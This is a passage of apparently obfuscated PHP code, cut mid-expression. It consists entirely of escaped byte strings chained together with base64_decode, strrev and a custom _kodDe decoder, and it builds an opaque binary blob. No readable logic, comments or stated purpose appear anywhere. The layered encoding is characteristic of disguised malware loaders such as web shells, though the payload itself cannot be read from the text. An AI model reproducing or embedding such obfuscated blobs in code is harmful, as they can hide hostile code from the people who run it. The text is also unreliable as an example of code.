72\306\260\123\244\265\154\133\123\114\16\352\62\377"."\xb6\xbc\xc3\x6\xe3\x79\xa7\x70\xf9\xfb\x94\xd2\xce\xb7\x8a\x64\x39\x53\xb5\x24\x2e\x4e\x45\x99\xed\xa2\x25\xf7\x14\x22\xc0\x14\xca\x62\x30\xb1\x98\x42\xb5\x4c\xbf\x89\xe8\x2e\x9d\x95\x81\x29\x4e\xbf\x34\xae"."\x53\x19\xb\x3e\x94\xd6\x78\x3f\xe1\xde\x63\x93\x3\x49\x70\xa3\x72\x26\xdc\xcd\xa8\xe\x8c\x7f\x3b\x85\x6a\x25\x5e\xbe\xa3\xa9\xac\x1e\x82\xde\x16\xf5\xc8\xe3\xa5\xc\x71\x6d\x36\x6c\xa7\xd2\x9f\x23\xa1\x1a"."\x45\x34\x6f\xb\xc6\x1a\xa9\xf7\x17\xb2\x92\x18\xcf\x8c\xc4\xe0\x93\x23\xd9\x8c\xd8\x70\x41\xd7\x40\x6f\xca\x4d\x1b\x51\x51\x8a\xa\x29\xaa\x9c\xd2\xc6\xf9\x0\x1b\x85\xf6\x16\xd7\x9c\xa0\xab\x3d\x85\xcd\x5f"."\210\276\250\14\141\365\215\231\153\254\254\365\325\124\52\154\33\332\130\331\25\157\105\202\371\302\5\107\316\157\66\263\171\314\126\310\236\13\267\227\122\356\2\150\343\174\54\364\260\110\247\253"."\73\202\161\15\126\235\371\176\31\157\276\177\242\122\241\51\130\22\133\241\166\206\3\361\326\110\264\35\150\74\237\27\144\225\117\226\233\155\136\301\221\212\226\127\307\202\61\314\2\55\231\161".base64_decode('kajcFyvKUuKKcpS4wkWJK0opcUU5OhsCgtSy2hozh+YrWmizviSQRbwt1LFUbY+0BMNqqA==')."\3\11\160\361\122\170\127\147\113\200\261\101\31\336\24\211\267\71\240\135\110\204\133\26\10\207\334\350\301\25\241\130\74\126\66\11\301\272\202\256\224\226\46\265\63\32\154\15\255\340\321\326"."\x50\x30\xdc\x12\x53\x9b\x3\xcd\x6d\x2\xa7\x23\xd0\xe\x11\x24\x2b\xe9\x99\x94\xe5\x77\xe2\xab\x48\x16\x8d\x71\x1d\x9b\xa\x4\x7\x31\x87\x5a\x4b\x65\xa\x1b\x55\x70\x62\xb4\xaf\xd1\x61\x38\xa0\xb9\x58\x4b"."\x49\x5a\x2\x3a\xca\xa4\x59\xe4\x92\x25\xdb\xc4\x67\xd9\x52\x8b\xf6\x64\xd0\xed\x6c\x43\x52\x45\x7f\xaa\x95\x40\x4c\xb1\xf3\x50\x6\x5a\x54\x13\xa3\x3c\x48\x9a\xc1\xe2\x48\xa\x81\xef\x2b\x20\x17\x97\xd4\x40".base64_decode('xThN0u6nPCDQZ3NJ1BVHS4hIQyMQIOpQRAlkROAzBlqQCnaAVadPqCLVSGcwGsCKTHV5NA==').base64_decode('0rEYMgyndVaBEHR/FduOgj7TFuu6ljE0ptgSnT5gsq5EW3Am5OdYPyewUMMkXRboQxOZCQ==')."\x24\x66\x91\x97\x9f\x30\x4d\x28\x33\x83\x77\x5e\xeb\xd8\x42\xcb\x35\xa0\x3\x16\x23\x8b\x11\xb6\x44\x4f\x5f\xc7\x96\x30\x20\xd6\xc8\xd2\x60\x87\xca\x68\x89\xc6\x24\xfa\xa3\x80\x60\x34\x1a\x89\x42\x17\xd8\xe6"."\x20\xd3\x7e\xd1\xc4\x68\x30\x16\x8c\xb3\x6f\xaf\x2e\x1a\xac\x83\xfc\xbe\xe9\x40\xb7\x3a\x12\xeb\xe0\xf3\xfe\x33\x7a\x86\xa7\x57\x75\x7b\xa7\xfb\x7a\x51\xa0\x7a\xda\x22\x1a\x85\x58\x8f\xcf\x11\x65\xd2\x76\xb1".strrev('§=?EéN€ŒzıO:Úï@OW£$^Ş¹Ş55Şh×xèl-WñïãĞİXZÊ°IcsÀ')."\xf6\x78\x4f\xfd\xee\xaa\x45\xdd\x3d\xbd\x95\xd\xd3\x27\xf7\xf8\xa6\xf4\xc\xf7\x4e\xab\x5e\xc8\xbe\x93\x2c\x16\xd0\x36\x80\xad\x6d\xa8\xaa\xa9\xe9\x55\xa8\x4a\x68\xa3\xca\x51\x72\x12\x2b\x26\x8\x2c\x61\x8d"."\x91\x17\xd0\xb5\xb3\xd6\x33\x38\x1a\x43\xbd\x5f\xe4\xe8\xf6\xf6\x4c\xef\x5d\x28\xe5\x93\x40\xee\x6f\x21\x6e\x8a\x84\xbe\x34\xc7\xb\x78\x4f\xc7\x2d\xe3\x59\xf1\x4c\x7\xfa\x28\xe6\x92\x62\x41\xc4\x33\x21\xa1"."\xf1\x1d\x5f\x7f\x4e\xec\xac\xec\x2\xd7\x88\xe\x21\xea\x14\x3c\x77\xed\x54\xfa\xbb\x9e\xd\x64\xbf\xe\xd3\x9c\x9c\x86\x30\x81\xaa\x98\x33\x56\xb3\x2d\x4e\x4e\x5f\xd\x1\xd3\xe6\x14\xad\xdb\xc3\x3a\x23\xf".base64_decode('BHfEEXGwdQAlSbGMtG4Q9RWnUU5MRl7Fu71hHkPLCozTEYBtJbW8HpNaqKrxQFM4qDKeAg==')."\274\227\305\11\37\154\342\347\46\250\151\202\207\62\216\40\251\246\210\252\10\346\272\265\72\243\20\126\100\267\131\15\344\10\311\52\346\361\216\111\101\43\216\372\126\101\22\234\322\270\100\241"."\135\16\371\124\171\0\362\174\47\204\165\233\272\230\364\230\47\101\235\362\142\204\54\264\23\141\173\1\177\125\117\117\261\133\117\365\166\43\302\327\274\175\275\153\147\254\257\146\372\23\177\17"."\xfa\xc3\x22\x81\x32\x87\x19\xaa\x66\xb3\x2e\xe1\x9c\x50\x5d\x1c\x8c\xfb\x70\x8d\xb8\xfa\xda\x11\xe1\xc9\x34\x6a\x16\xf8\xd6\x22\xef\xd8\xdb\xdb\xa6\xad\x65\x1c\x45\xc4\x31\x4\x86\x99\xcb\x62\xa0\xcc\xa5\xe3".base64_decode('Hha8Cwsd0nkQYaUdXHnKZWLpQALniOm2j2N4pEQVxR1nc40VMF+MHJpYzdIyR9XpMaIScA==')."\34\42\131\272\126\110\246\133\213\231\214\315\65\61\31\143\20\276\0\263\6\316\264\274\364\107\231\136\56\53\332\225\60\305\344\64\250\106\305\264\162\210\241\134\316\114\45\144\242\23\13\354"."\342\0\22\145\342\112\25\73\177\121\102\35\112\123\44\22\16\6\72\24\274\226\303\32\204\4\205\130\260\63\200\26\60\254\342\214\305\203\121\12\17\265\170\131\271\53\274\114\277\301\3\6"."\x74\xbb\x99\xa7\xfb\xa\xdd\x56\x33\x26\x63\x23\x4e\xd\x9\xde\x9c\x79\xb0\x9e\xc2\x83\xe5\xa\xf\xaa\xb5\x7\xab\x36\x3c\x62\xeb\xeb\x11\xc7\x1a\x9e\x21\x43\x1f\x26\x1\xbe\x2d\xf5\xc0\x6e\xd5\x23\x94\x32".base64_decode('EAy1eAyrhey6yQdIEquCncYa54w26qHVCetDesbD1DUeVkcPU1J5iHKpBarVhSYWVIsEEQ==').base64_decode('/0x7MAFh+vWIgxaPOZzTCwQFOkZs2D1iM+/pL5jFfCf7phSj1QKAqDMHRE3T9jC9l0dWgA==')."\101\55\2\154\236\224\355\316\362\255\41\375\357\256\4\320\27\116\52\355\245\57\31\254\322\361\160\352\376\326\322\22\101\321\271\236\255\167\16\34\242\203\343\222\47\356\160\21\132\46\46\52"."\156\100\253\6\107\172\264\130\71\314\11\64\347\44\124\161\256\42\116\323\204\234\353\126\303\270\317\331\360\107\321\146\52\46\175\316\326\372\331\267\60\263\342\133\255\62\250\64\34\325\223\243"."\x49\xa1\xd7\x69\x91\xb4\x45\xce\x58\xa3\xb3\x3d\x1e\x32\x81\xca\x11\x7f\xf9\xc1\xe5\x4\xcd\xc7\xe2\xc8\x23\x8e\x60\x9d\xcb\xa8\x9c\xf\xac\x63\x72\x7c\xf9\xb4\x84\x6\x11\xde\x17\xc9\xb\x39\x82\x56\x16\xf3"."\337\30\132\327\132\63\254\67\352\344\144\340\274\36\147\14\317\52\37\341\304\344\310\72\306\65\211\341\140\153\134\131\22\101\154\313\60\125\232\107\305\310\12\371\307\314\51\216\262\131\167\51"."\215\44\135\304\265\134\212\102\126\41\26\277\252\261\202\175\244\302\221\135\320\207\263\22\36\26\165\174\115\14\265\334\11\230\16\110\363\305\262\304\100\21\261\12\26\101\370\323\54\330\170\141".base64_decode('PSyEdAYTQysTpMRnBIDVy/FdHBWTiZGEgj8ABRBxBfMSr5gWUtTZ5S6KdK2duIs6jdyokQ==')."\x8b\x19\x58\xaf\xe0\x86\xae\xe3\xcb\xaf\x58\xfd\xf1\xac\x16\x31\x4a\x95\x13\x85\xe9\xea\x81\x95\xb\xb4\x7c\xf\x9c\x9\x7b\x32\x46\x6e\x50\x5a\x99\x85\x4e\x13\xd5\x1e\x67\x95\xea\xe\x25\xb9\x6a\xe\x5\x49"."\x28\xa2\x7\x60\x22\x3\xc5\xa7\xb5\x82\xe8\x4c\xc6\x7e\x30\xf\xe0\x6d\xb0\x30\x8a\x88\x4a\x68\x7d\xda\x90\x90\x4c\x1c\x79\x24\x26\x62\xd9\xa3\xac\xf6\x72\xd0\x59\x28\x8d\xb6\x78\xc8\x6f\x1b\xaa\xbc\x3c\x5d"."\371\360\24\121\315\31\22\345\75\210\27\204\121\137\241\37\322\220\270\351\301\12\175\364\103\327\157\146\32\100\220\30\335\27\263\55\160\100\200\303\313\20\3\0\302\301\35\136\305\30\10\110"."\21\252\244\7\340\14\310\51\7\320\232\4\70\137\107\42\173\6\55\143\5\37\236\43\213\361\142\304\372\204\262\67\231\346\142\72\152\47\24\57\112\210\225\244\311\330\102\235\207\371\274\130"."\27\370\251\30\237\142\242\177\305\174\352\27\25\302\335\251\226\326\3\123\160\371\170\153\301\344\122\55\137\322\335\110\315\144\3\311\55\74\134\313\260\324\37\16\321\241\4\44\345\161\13\21"."\56\250\53\212\5\13\327\264\226\154\17\310\331\114\201\256\130\76\264\35\0\103\35\117\215\44\137\11\376\262\226\236\217\301\12\267\336\65\276\266\151\242\75\146\301\127\100\137\24\25\221\170".strrev('E vOc¦\\›ùyòĞJ¸«Åm±yc2±)ÛüH²…¾^mQyò$p*YtúÓ°b0')._kodDe('LNJCha5MqHsmh8l2GDKrK34iPcpXdAqcmQC79oFKlM9ON4vYTlboHMMNE82jPuJSZxcs8v4=').base64_decode('TiPSgE8IROVNnJJmHmhJMvvLmkO6BMTneHmRIkVpspQkCpWw+FCQGqGZmSJitOgFggt5yQ==').strrev('ÏHÌƒàq”}‡ğ¢ÑõHpxZ:Vå·›Îs2€ŒÆ|LÚ}#…Z‡/DøuŞ~Nœn')."\27\21\56\105\225\165\221\345\13\212\211\303\174\147\254\74\172\40\223\21\346\127\356\370\204\131\50\303\220\63\311\220\11\263\265\222\15\60\263\134\50\7\343\133\237\211\305\171\367\201\272\223".strrev('pgŞ]!âãcZÒM8.DL†xóÚ]X³ÿîÜr¬gÓaLéÈÚszëG,ağ¥ŞìI°í,OÉ')."\105\255\140\125\174\301\207\342\204\30\3\242\204\24\121\155\207\64\26\45\345\113\323\311\101\41\150\372\322\376\300\213\135\50\342\263\46\240\131\67\36\267\125\41\74\161\204\257\321\162\46\234".base64_decode('hMdSLlRIf1+AzwsXkqCMh2gXJ0xUV5bMS7lxy92b939Cwy8/f9vf/nUHDdfOBa3jugPXHQ==')."\x4c\x42\x7\xc9\xd6\xe5\x1b\x57\x8c\x9a\x27\x3d\xf3\xb5\xc5\xbf\xf5\xbf\xf9\xd4\x3\xdf\xbf\x7d\x72\xfb\xa6\x2b\xaa\x66\x15\xb5\x4d\xe7\xb7\x5c\xf8\xa6\xf7\x17\x8b\xdf\x7a\x3a\x3f\x7c\x65\xcf\xea\xa1\xfe\xb9".strrev('_w÷ö½48rCv¾—š—+Ötù¶úà÷¹?QÑdşnwĞûÿGTï…õ?_kÏ£ö_¦ó').base64_decode('N3vG+x/vSl793Q/PqVy45sMnJ//s4LMezr/ZvPW2w1986pAPt/3nnnMO/M3u8SNPOrHjwA==')."\355\277\375\350\333\13\206\56\135\370\223\257\46\357\177\352\163\363\231\23\206\152\117\376\333\161\123\137\315\117\72\342\306\123\266\57\75\370\362\347\16\375\143\54\274\147\365\207\227\74\231\73"."\x67\xd1\x49\xb1\x13\xda\xef\xdd\xf1\x80\x7d\xe7\xd\x4f\xe\xec\xd8\xf1\xed\xa1\x77\xaf\xcf\x3f\x53\x38\x7a\xce\xd2\x9d\x53\xfe\x79\xb1\x32\xff\xb9\x1f\x6c\x52\x8a\xcb\x96\x34\xee\xff\xd7\xb7\xdf\xfb\x74\x66".strrev('C¦÷py¿ª¯‹³ıÿÍñ„ğ?YNså<ßïüî´7[Ïezì	nÛ¼ÏúÍv<m–sÆüh')."\xd3\x57\x1f\xf6\xbb\xcd\x1f\x4c\xd9\x9d\xf9\xd5\xdf\x8a\xdf\x5e\x73\x72\xe5\x8d\xa7\x25\x2f\xf3\xa6\xac\x13\x67\xdc\xf2\xcc\xdd\xd7\x8e\xdf\x78\xde\xd8\x4b\xd7\x6e\xbc\xe2\xe1\x57\x9f\x5d\xa8\xff\xa1\x7a\xbc".strrev('›Yùy.G±UÅ~šo\'½íõÏÑĞ÷\\\'[öıçô½OŸ÷?¯4‹êÉîÒ}~ƒµî')."\x7f\x39\xfd\xc5\xff\xfc\xd9\x9c\xff\xf8\xe6\xd8\x71\xff\xfd\x8c\x9e\x99\xf4\xf5\xdf\x4f\xe9\xbb\xae\xe6\xcc\x7d\xf1\x49\x47\xcf\x37\x37\x5d\xf8\xd2\x47\x97\xae\xba\xf7\xa6\xb7\xfe\x76\xa9\x71\xdc\xd6\x57\x9f"."\326\143\147\135\162\324\171\367\234\375\265\246\123\56\374\375\234\333\176\263\45\171\337\366\312\333\164\243\166\301\357\157\235\365\246\165\320\371\273\333\326\35\235\135\165\323\147\277\373\132\341\200".base64_decode('Jx+4/rNJS9477+i5uW8kv1kdPuJc7zeWWJsPOHv9ugOWTvqTcePdT8/6xxM1pyy9++30rw==')."\xeb\x8e\x7e\xe8\x95\xb3\x7f\xd5\x3c\xfe\xe6\x37\x5b\xcf\xb3\xaf\x54\xb6\xf5\xcc\xde\x30\x1c\x1e\x3e\xb8\x73\xc5\x93\x4f\x1d\xd6\x34\x72\x70\xe4\xdb\xe7\x9e\xfd\xc1\x8b\x85\xe7\x9f\xdd\xf0\x42\xdd\x43\xda\x6b"."\x57\xfe\xe0\xab\x35\x77\x5d\xb0\x4d\x3f\xf2\xad\xde\x53\x7f\x3e\x64\xcd\x1e\xbe\x69\xc1\xaf\x4f\xeb\xf9\x74\xce\x43\x9b\x15\xe5\x65\xcf\xc8\x73\x9d\x93\x4e\xba\x72\x46\x47\xf4\x2b\x9b\xb7\x5c\x3d\xb6\xe1\xa3"."\xab\x2f\x3c\xbe\xfd\xc2\x5b\xaa\xb2\x67\x5f\x73\xc9\xce\x81\x9d\xf6\x67\xb7\x25\x87\x36\xec\xf9\xfb\x6d\x1b\x7f\x74\xd3\x9f\x1f\x3f\xfb\xc9\x4c\xcf\xbd\xf3\x6b\x16\x1d\xf1\xad\xc3\x73\x17\xbf\xf8\xb8\xb1\xfb".base64_decode('wJHV3/3+X9/Rbtx3z+HFg96uu/Vw448vjm08r0lZ+JP61Iv3bjvqGxccN3zBnatOP3nlsw==')."\53\16\170\373\272\175\215\337\330\127\63\376\354\241\211\203\277\327\164\374\237\356\73\74\174\202\157\331\15\317\326\67\14\205\7\253\16\71\347\212\323\137\270\247\362\346\77\34\262\140\311\5"."\273\237\251\170\142\352\3\43\77\256\137\61\371\346\117\106\74\201\343\57\375\126\360\250\267\56\73\366\311\343\127\134\374\213\263\116\334\377\360\275\47\234\161\375\71\217\377\351\275\343\206\376"."\x78\xdd\xde\x93\x63\xd1\x8b\x8e\xf2\xde\xfb\xb4\x91\xf4\x1c\x16\xd8\x7e\xf1\x45\x27\x9e\xfa\xa7\x13\x26\x87\x5f\xd4\x3e\xe8\x3c\xe9\xdd\x9b\x67\x65\xae\x5a\xf3\xd1\x8f\x5f\xf5\x7d\x34\xfc\xf4\x69\x97\x8c\xec"."\xae\xe8\xda\x5b\x5f\xbb\xf5\xfb\xcb\x96\xbc\x38\x7c\xf6\xec\xd3\x2b\x5a\x16\x25\x8e\xfc\xe0\x89\xb6\xf\xe\x7c\xb2\x73\xe5\x39\x1f\xdc\x70\x7a\xc3\x9f\xbb\xa7\x2d\xb6\x36\xb4\x9e\x18\xbc\xe5\xa0\xdd\xb7\x3e".base64_decode('F9h1x7Zvbnn13mXm6tdXF7vffeD0T5/esPGsGY/cdsGFd7239NIfH6ceXXziil/4j/xx9A==')."\24\145\360\342\45\167\77\172\372\244\123\336\173\353\334\43\56\173\331\72\357\344\345\341\303\206\152\266\317\273\155\325\277\66\166\236\61\62\375\153\173\337\231\271\355\371\303\106\116\325\162\277".strrev('ÿ±ş/är<=gw÷ù¦‹Õü¾øş¶qêIó^ó^wüD‘Œá¶ º¿-’ßpÜßİèMı')."\332\127\216\173\100\353\374\367\366\225\17\114\76\364\223\374\311\7\274\366\311\127\256\274\375\62\257\167\336\33\273\342\17\235\161\367\343\326\321\267\174\360\363\215\47\371\117\376\316\41\323\56"."\xdf\xf8\xe4\x6d\xe1\x4f\x1e\x1e\xf8\xda\xb9\x3b\xa6\x9c\x7b\xc8\xd2\xd9\xca\xe4\xab\x1f\x99\xfa\x95\x7f\x7a\x9b\x6f\x3b\x66\xf6\xcb\x1b\xdb\xbf\xb9\xbf\x75\x75\xe7\xac\x5d\xdb\x97\x5d\xfc\xf1\x1d\xeb\x1e\x7d"."\343\107\351\305\257\344\42\37\351\207\134\173\311\263\237\14\175\362\351\3\257\336\375\352\217\176\77\260\274\255\346\240\213\247\130\251\135\257\275\173\337\45\57\75\267\363\326\276\373\136\277\240"."\171\323\326\231\227\256\270\175\123\346\334\342\131\137\171\374\204\151\117\355\72\164\367\332\331\326\273\15\77\173\264\123\177\357\203\367\326\37\34\337\174\371\113\163\172\166\357\275\264\352\272\351"."\x97\x7e\x3c\xfc\xf4\x68\x4f\xfb\x1f\xee\xdf\x7e\xc8\x3f\x7f\x37\x76\x4c\xfb\x94\x7\xd3\x4f\x9f\x74\xd4\xa3\x5f\x7b\xd5\x7b\xd6\xce\xda\x13\x5f\x5f\x71\x6a\xdb\x94\x67\x7c\xcf\x8d\xfd\x57\xf7\x4f\xff\xb5\xff"."\17\355\277\177\366\356\275\263\227\55\177\65\167\367\357\66\25\16\73\345\153\103\347\275\323\370\324\276\67\147\377\322\367\331\376\347\357\134\176\346\143\153\76\375\373\207\73\42\217\215\176\366"._kodDe('Ki/asROwL4DXOyfvM9FEke8SO+zw2uNySeupA6cTiuKpW1vxYn3sM+sLq1nxG7PEq1Xv3Zo=')."\xe9\x43\xde\x3c\x64\xc1\xcb\x5f\xf9\xc1\xd1\x7b\xdf\x1a\x38\x60\x73\xea\xca\x17\xcf\xf9\x43\xec\xeb\xf5\xaf\x1d\x78\xd8\xad\xed\x8f\x9f\xff\xfd\xc1\xff\x9a\xb3\x68\xd1\x77\xe\x7f\xb1\xfb\x88\x63\xef\x68\xf9"."\107\367\203\67\334\257\117\11\337\65\343\352\364\356\155\207\134\224\356\70\50\226\277\151\316\245\335\177\374\153\347\225\307\156\373\360\370\115\177\71\161\174\317\151\357\334\260\355\376\147\6\177"."\272\374\376\233\107\372\257\171\150\377\277\337\332\166\377\53\237\356\72\175\107\264\176\313\345\251\321\227\346\377\366\127\255\165\236\271\113\136\276\350\225\232\43\327\154\252\375\360\271\233\176\164"."\xbd\xf2\xe9\x71\xe6\x1\x4d\xbf\x9a\x74\xc9\xf\xa3\x4d\x17\xc5\x97\x2c\x9b\xfc\xea\x82\x1f\x1e\xbe\x7b\xf3\xa3\xb7\x7\x9b\x3a\xf\xd9\xf0\xc2\xb9\xef\x6d\xde\xf4\xd5\xbd\xc7\xfc\xf6\xd2\xfa\x3b\xcf\x30\x87".base64_decode('ZtzW+Eax9qbQrlV7hr+7+Zj3Dlza8M71NYcesfGt9x4de+W9fQ9mzvv0k+9ddN138z+elA==')."\xbb\xd7\xaf\x3e\xbb\xef\x6f\x9b\x1a\xe7\x36\x4c\xbe\x2f\x73\xdb\xaf\xff\x7a\x78\xec\x86\xdf\xf9\xbb\xbe\xf3\xea\x61\x6b\x9f\x3e\xfe\xfa\x1b\xbe\xfd\xcf\xfd\x1d\xf\xcd\x78\x3e\xfb\xd3\x7f\xbc\x70\xe4\xe8\xda"."\232\327\336\231\175\372\130\207\267\171\140\137\115\363\326\367\373\143\377\110\65\134\147\17\377\150\375\177\335\375\352\264\111\267\235\172\335\211\375\346\160\362\207\203\57\347\316\177\343\276\242\225"."\55\336\272\342\216\13\23\221\73\152\246\55\175\153\312\153\77\270\347\77\157\336\364\354\367\36\132\367\263\327\247\76\367\357\237\307\137\134\265\177\317\141\317\117\336\175\232\162\373\257\207\73".strrev('ÁÉw^×ª×Àõ7=Ó¾äôõ6Ä†Íõı·ç'."\r".'¡Ióï§úß¢¸ã{/¯Øø·,¾(x«ş¯')."\213\132\376\174\315\135\257\364\37\163\304\23\77\134\164\310\357\36\337\72\374\347\366\160\327\13\77\331\365\247\257\374\266\361\320\313\236\370\307\127\377\126\343\333\172\313\217\317\73\372\217\127"."\x26\xce\x9e\xbd\xf1\xd5\xdd\x85\x25\x8f\x6e\x5e\x7d\x4e\xf1\xba\x97\x36\x27\xfa\xd3\x67\x5d\x19\x4e\xae\x78\xff\xde\xe5\x9b\x7c\x5f\xff\xe8\xaf\xaf\x1d\xff\xc8\xf0\x53\xa7\x6d\xff\x75\x5d\xfb\xd4\x13\xbf\xf2"."\x8c\xf7\xf0\x95\x2f\x34\x7d\xfc\xf3\x33\x5f\x69\x7b\xf9\xb2\xf5\x4b\x4e\xc8\xee\x1a\x58\x3a\xae\xfd\xbc\x73\xf8\xc9\xb6\xdb\x8f\xfd\xf6\x47\x1f\xab\xdf\xed\x7b\xf2\x9a\xcc\xd\x7f\xdc\x1d\xdc\x7c\x9a\x7d\xed".base64_decode('28q2E/8jcO2kKX88oP6fHv9/nfHDjvmH/WxZ+/JjklXX3dW56uFtrz27d9PTgeO36Y8f1A==').strrev('û­óø½l¶Çúìt_5wãûşÿ]šóçíïüL„í<®÷Ñ«îrFf½_Ñı{¿¯òñó')."\xcb\x61\xcf\xae\xdc\x78\xcb\xae\x5d\xd1\xb5\x1b\x6e\xb\xde\xd5\xd5\x7d\xff\x85\x77\x6e\x19\x3f\xf5\xce\xfc\xe5\x1d\x4f\x3c\xf8\xfe\x9f\xaf\xbe\x6f\xc6\x81\xff\xf8\x8f\x7f\x3d\xb4\xff\x2f\xdf\xbd\x75\xd9\xef"."\116\357\135\273\177\305\361\367\37\372\342\332\223\243\13\356\331\375\320\170\123\333\225\223\356\375\312\175\247\34\174\343\231\335\321\300\147\331\277\155\335\377\265\245\253\26\116\337\333\373\220\147".base64_decode('fFfL4/Ye30sHDrd8/tIv7khNmfTmT7ddPDJpx52fPHXswhs2vD75l69Hb277w82/uavu6g==').base64_decode('Fu03scqv3nTXtKt++fnoB39+/qI3zhz66Okdv1y4/539Zz427/N9bz2/9Xu9+99+441HPg==').strrev('ú\'\'ùşogıg³<ï×ö~÷¿Ÿ9‚Èùşy_±óõLü=P¸÷¿Íl{oµÿ³Ş')."\xdf\xbd\xf9\xda\xc7\x9e\x79\xfd\x1a\xdf\x21\x3f\xbf\xfe\xa3\xb5\x27\x1f\x33\x6d\x7c\xcb\xce\xd9\x7f\x18\x1f\x34\x1f\xab\xcc\x3c\xda\xbb\x3d\x3e\x38\x6f\xe7\x47\xbb\x3e\xfd\x79\xe0\xbe\x57\xfe\x62\xaf\xfd\xf4"._kodDe('KVC+79PN2SyIkpFZUO7CvGaUxK8S01yI2X805fF0szGi3GqT7CgsdFTIVTAScwzP8soYhAA=')."\337\275\60\71\251\367\354\376\177\5\116\330\72\363\362\103\57\352\273\363\343\257\136\166\264\347\304\223\16\157\270\346\371\243\47\335\160\173\342\244\232\23\316\74\312\323\374\364\267\76\74\236".strrev('n»7!@Ê)ë'."\r".'÷öâ?DÍ§Î'."\n".'09{'."\r".'1VrkÃ7v¨pÕÁ™£²	(ùRG$+]')."\66\15\44\164\63\275\132\203\342\353\240\220\332\271\64\60\267\6\114\54\327\214\246\63\371\21\120\330\131\371\204\231\142\133\262\31\263\340\202\121\175\75\344\236\65\27\40\63\153\340\33\105"."\x3d\x3b\x90\x66\x16\xf0\xf5\xac\x6c\x86\x56\x5f\xb\x22\xdf\x4c\x68\x50\xbf\x9e\xb5\x86\x98\x6a\x73\x76\x1d\x54\x61\x66\x2d\xb4\xd\xb2\xf5\x6b\x48\xd4\x67\xc6\xc8\x85\xbe\x6c\x3a\x3f\x3a\x0\xad\x60\x5\xd6".base64_decode('8bxQtbl18HFjMFtIpKHVg4ncUCEDknjaTg6vYbuvufVggZYfWJMYtnKsFKjorHrWm6ylKQ==')."\63\147\215\246\341\100\176\316\14\250\107\316\54\14\255\321\140\377\64\124\30\110\246\164\330\16\14\16\364\345\122\243\254\367\147\100\65\207\212\332\232\221\2\250\253\7\254\301\202\226\205\314"."\265\263\131\37\245\362\71\203\155\116\352\131\263\146\316\204\76\52\214\344\120\31\154\374\355\154\152\70\15\133\330\202\221\34\34\60\327\260\176\201\32\316\255\205\117\133\31\163\164\144\20\32"."\x30\x90\xb7\xfa\x8d\x22\x50\x96\x9d\x19\xe8\x4b\x59\x90\xc2\x7a\xa0\x7e\xe\x7c\x59\x33\x87\x12\x5\x3\x52\x33\xe6\xe0\xea\x21\xd6\xde\x99\x30\x6\x3\x29\x6b\x70\xcd\x6a\x0\xd6\xd7\x40\xbe\x19\x73\xa0\xa4".base64_decode('GTNhXAcSVnYwz4xRc3l9ZAh2pvWsf+bOhe4eGcytzhhQ5pxZs9j4w7DMYXgz4CMzZ0EJaw==').base64_decode('EqOFoT52vD86MtyXgl1df186b7D5kOjXCgPsJp3RPzSwmln6DKzJJgx2Xa52Lnx5xlz4sg==').base64_decode('XrTXpPthBPtMOzFcgC6fO3sm65c6Vm9ouW5n+4zV0N2z6wAvP1LsTw9C7jn10JLa2hrWKQ==')."\20\30\35\36\112\144\7\30\51\261\62\353\346\100\325\346\260\362\352\30\215\324\326\103\316\325\326\100\141\204\221\174\312\264\163\3\314\22\174\146\55\24\63\232\114\130\371\1\166\152\250\17"."\131\43\203\374\113\60\222\5\333\30\112\231\100\1\303\253\373\315\324\32\50\145\324\116\26\7\262\32\243\34\30\223\241\234\151\15\144\200\245\350\205\154\142\200\131\317\352\103\111\163\315\40".base64_decode('jEd2tDCop4B39CWMXH8SUurqoANnzGDDXc/6DhptrMkW7BQzK0MbXCsN07y+HjI1aclBpg==')."\16\346\106\307\262\55\57\65\344\242\312\63\371\374\204\135\220\64\162\276\254\226\343\106\64\155\300\234\145\330\240\256\63\323\372\4\375\265\205\71\6\230\21\3\334\310\352\102\305\115\17\22"."\130\116\261\361\306\132\17\311\240\3\107\143\162\51\311\234\55\45\243\230\43\65\46\133\377\103\353\160\15\175\162\253\127\146\231\225\165\231\3\111\320\315\132\326\260\131\200\36\33\64\123\311".base64_decode('jFlMOUpNJXxlepK2pFxKnxvODYBEgQ5TdgZz9FqCjCi3NsJ/oN70qq+Fjcn57TR2nAV2xw==')."\226\134\206\217\15\127\102\42\22\252\277\267\65\153\320\47\203\275\162\252\221\103\255\310\144\174\316\53\341\370\156\166\127\247\32\17\304\226\112\266\175\370\356\260\243\52\45\255\23\103\51\365"."\253\74\242\316\236\140\24\263\157\307\316\261\255\127\216\157\273\147\174\313\366\261\207\57\337\267\375\236\261\135\333\120\164\317\203\27\217\155\377\336\333\327\154\334\363\340\226\75\17\236\265\357"."\374\237\274\377\310\346\261\255\73\366\235\263\153\354\372\333\307\176\160\376\236\235\273\366\75\166\376\336\333\57\332\363\340\335\343\327\137\70\266\361\201\75\73\257\34\273\340\373\143\347\157\35".strrev('•L„[f‰[u‹àÌ­6r?ï©çn›¾àø=Œ6GŞq«îìmÉDñü#×]Ë|¿').base64_decode('ChCobvmUzoyOekxJ4stS2LrLTusFxSZWXhr6mzNzXkqA9Dq7pRg5nKywvvZxIo3r2TwmNQ==').base64_decode('6CU/vdvquCYh0WO5bqYJZagL97UYqyochNM6rNhT+jQESDUofSgbO9HoVWyThbOjfNBdkw==')."\xa2\xec\xb0\xf2\x6a\xb0\xa1\xed\xe7\xfa\x75\xa1\xf6\x85\x8a\x49\xf7\x5f\xe8\xd9\x4a\x9\x49\x91\x59\xe6\x64\x11\x8e\xf9\xe7\x64\x2e\x72\x92\xb3\x27\x40\x2f\x4b\x2c\xb\x3c\xa\xad\x8a\x47\x21\xe7\xc9\x8a\xf3"."\x12\x37\xb6\x14\x60\xa7\xef\xf2\x9c\x91\xab\x5f\xd0\xf3\x19\x7e\x8c\x84\x55\x9b\x65\x3b\xd1\xd5\x84\x58\x99\xee\xe2\x8d\x70\x24\xa2\xf9\x58\xb4\xcb\x20\xca\xbd\x2a\xeb\x7b\xd\xb3\x39\x83\x18\x9c\x38\xe8\x24"."\147\372\242\272\64\52\364\314\350\103\234\77\26\364\224\301\354\215\365\54\301\4\276\350\223\116\171\350\225\46\156\364\234\104\144\137\160\34\140\315\137\230\117\347\261\107\14\173\336\102\270\75"."\xc0\xae\xbd\x49\x75\x80\xb0\xb8\xbd\x25\x43\x33\xee\x43\x31\x3e\x49\x5a\x9a\x24\xbf\x14\x18\xad\xc1\xeb\xf5\x4a\xca\x5b\x61\x71\x86\x43\x2a\x6b\x18\xb9\x86\x13\x4b\x17\x6d\x6c\x58\xb1\x38\x63\x26\x18\x99\x88"."\23\147\204\36\304\223\173\42\170\13\67\304\100\263\276\277\37\225\327\100\356\307\52\323\25\324\206\71\276\132\24\40\363\143\246\15